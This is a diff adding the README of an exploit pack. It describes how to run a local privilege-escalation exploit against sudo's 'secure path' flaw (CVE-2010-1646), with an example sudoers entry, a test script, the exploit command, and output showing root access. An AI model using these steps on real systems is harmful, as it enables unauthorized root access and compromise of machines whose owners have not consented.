@@ -1,0 +1,38 @@
+D2 Exploitation Pack
+====================
+
+Copyright (c) 2007-2010 DSquare Security, LLC
+
+License information
+-------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Local exploit
+---------------
+
+Sudo 'secure path' Security Bypass Vulnerability
+
+How to use the exploit
+------------------------
+
+If you have for example this line in /etc/sudoers :
+
+[...]
+compaq  ALL=/tmp/d2sec.sh
+[...]
+
+and in d2sec.sh script:
+
+$ cat /tmp/d2sec.sh
+#!/bin/bash
+echo "This is a test"
+whoami
+
+so, the exploit usage is :
+
+$ ./d2sec_sudo_cve_2010_1646 /tmp/d2sec.sh whoami /tmp
+# # id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),19(log)
